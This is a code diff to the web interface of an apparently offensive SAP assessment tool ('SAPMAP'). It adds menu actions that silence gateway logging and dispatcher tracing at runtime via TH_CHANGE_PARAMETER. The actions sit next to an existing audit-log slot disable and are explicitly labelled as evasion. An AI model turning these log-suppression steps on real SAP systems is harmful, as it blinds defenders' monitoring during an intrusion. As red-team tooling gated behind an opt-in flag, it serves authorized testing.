@@ -1039,6 +1039,12 @@ body {
       <div class="ctx-item" data-action="tier3_sal_slot_disable"
            title="Tier 3 MUTATION. Disables one or more SAL filter slots for a hold window, then auto-restores. Accepts a single slot ('1'), comma list ('1,2,3'), or 'ALL'. Primary path: RSAU_UPD_AUDIT_CONFIG (shared-memory only — no disk persistence, no SM19 header change). Fallback: RSAU_API_SET_PROFILE (persists to disk if legacy FMs unavailable)."
            >&#128263; Disable SAL Slot(s)... (Tier 3 mutation)</div>
+      <div class="ctx-item" data-action="tier3_gw_logging_off"
+           title="Tier 3 MUTATION. Sets gw/logging=0 (Gateway logging level) via TH_CHANGE_PARAMETER (shared memory only — no profile-file rewrite). Suppresses dev_rd / dev_ms gateway action logs for the session. Auto-restores baseline value on exit. Confirmed runtime-changeable on S/4 793."
+           >&#128683; Suppress Gateway Logging (Tier 3 mutation)</div>
+      <div class="ctx-item" data-action="tier3_rdisp_trace_off"
+           title="Tier 3 MUTATION. Sets rdisp/TRACE=0 (dispatcher trace level) via TH_CHANGE_PARAMETER (shared memory only — no profile-file rewrite). Stops dev_disp / dev_w* dispatcher and work-process trace writes. Auto-restores baseline value on exit. Confirmed runtime-changeable on S/4 793."
+           >&#128683; Suppress Dispatcher Trace (Tier 3 mutation)</div>
     </div>
   </div>
   <!-- Data Extraction submenu -->
@@ -4116,6 +4122,12 @@ function showCtxMenu(e, sid) {
     'tier3_sal_slot_disable': hasUsableAbapAccess
         && !!(mapState.evasion && mapState.evasion.allow_evasion)
         && !!(mapState.evasion && mapState.evasion.baseline_captured_at),
+    'tier3_gw_logging_off': hasUsableAbapAccess
+        && !!(mapState.evasion && mapState.evasion.allow_evasion)
+        && !!(mapState.evasion && mapState.evasion.baseline_captured_at),
+    'tier3_rdisp_trace_off': hasUsableAbapAccess
+        && !!(mapState.evasion && mapState.evasion.allow_evasion)
+        && !!(mapState.evasion && mapState.evasion.baseline_captured_at),
     'retrieve_rfcs':    hasUsableAbapAccess,        // ABAP-only RFC + BAPI
     'test_rfcs':        hasUsableAbapAccess && hasRFCs,
     'read_java_destinations': isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy),
@@ -4319,6 +4331,18 @@ function showCtxMenu(e, sid) {
          : ((mapState.evasion && mapState.evasion.allow_evasion)
             ? 'Tier 3 armed but no baseline captured yet — run "Capture Evasion Baseline" on this node first.'
             : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).')),
+    'tier3_gw_logging_off':
+        ((mapState.evasion && mapState.evasion.allow_evasion && mapState.evasion.baseline_captured_at)
+         ? 'MUTATES kernel state. Calls TH_CHANGE_PARAMETER to flip gw/logging at runtime — shared memory only, no profile file write. Suppresses dev_rd / dev_ms gateway action logs for the session. Baseline value auto-restored on session exit.'
+         : ((mapState.evasion && mapState.evasion.allow_evasion)
+            ? 'Tier 3 armed but no baseline captured yet — run "Capture Evasion Baseline" on this node first.'
+            : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).')),
+    'tier3_rdisp_trace_off':
+        ((mapState.evasion && mapState.evasion.allow_evasion && mapState.evasion.baseline_captured_at)
+         ? 'MUTATES kernel state. Calls TH_CHANGE_PARAMETER to flip rdisp/TRACE at runtime — shared memory only, no profile file write. Stops dev_disp / dev_w* dispatcher and work-process trace writes. Baseline value auto-restored on session exit.'
+         : ((mapState.evasion && mapState.evasion.allow_evasion)
+            ? 'Tier 3 armed but no baseline captured yet — run "Capture Evasion Baseline" on this node first.'
+            : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).')),
     'retrieve_rfcs':    'Needs a verified RFC credential or a SAPMAP-created user — RSRFCCHK and the RFCDES read both require a working logon.',
     'test_rfcs':        (!hasRFCs
         ? 'Retrieve RFC connections first.'
@@ -4418,6 +4442,8 @@ function showCtxMenu(e, sid) {
     'probe_rsau_api': !isAbapStack,
     'probe_rsau_dyn_profile': !isAbapStack,
     'tier3_sal_slot_disable': !isAbapStack,
+    'tier3_gw_logging_off': !isAbapStack,
+    'tier3_rdisp_trace_off': !isAbapStack,
     'retrieve_rfcs':    !isAbapStack,
     'test_rfcs':        !isAbapStack,
     'create_tcpip':          !isAbapStack,
@@ -5626,6 +5652,42 @@ async function ctxAction(action) {
         }
         updateActivityBar();
       }, 1000);
+      break;
+    }
+    case 'tier3_gw_logging_off':
+    case 'tier3_rdisp_trace_off': {
+      const param = (action === 'tier3_gw_logging_off')
+        ? 'gw/logging' : 'rdisp/TRACE';
+      const human = (action === 'tier3_gw_logging_off')
+        ? 'Gateway logging' : 'Dispatcher trace';
+      const valRaw = prompt(
+        'Tier 3: set ' + param + ' on ' + sid + ' to which value?\n\n'
+        + 'Common choices:\n'
+        + '  • 0   — silence the channel (typical evasion target)\n'
+        + '  • 1   — minimum logging\n'
+        + '  • 2   — default on most installs\n'
+        + '  • 3   — verbose\n\n'
+        + 'The baseline value will be captured first and auto-'
+        + 'restored when the SAPMAP session exits.', '0');
+      if (valRaw === null) break;
+      const val = valRaw.trim();
+      if (!val) {
+        showToast('Value required', 'warning');
+        break;
+      }
+      if (!confirm(
+        'RUN Tier 3 ' + human + ' suppress on ' + sid + '?\n\n'
+        + 'Writer: TH_CHANGE_PARAMETER\n'
+        + 'Param:  ' + param + '\n'
+        + 'Value:  ' + val + '\n\n'
+        + 'Shared-memory only — no profile-file rewrite, no '
+        + 'kernel restart.  Auto-restores baseline on session '
+        + 'exit.\n\n'
+        + 'Requires --allow-evasion AND a captured baseline.')) break;
+      flashActivity(
+        `${sid}: Tier 3 — setting ${param}=${val}...`, 3000);
+      await api('POST', `node/${sid}/tier3_set_param`,
+                 {param: param, value: val});
       break;
     }
     case 'retrieve_rfcs':
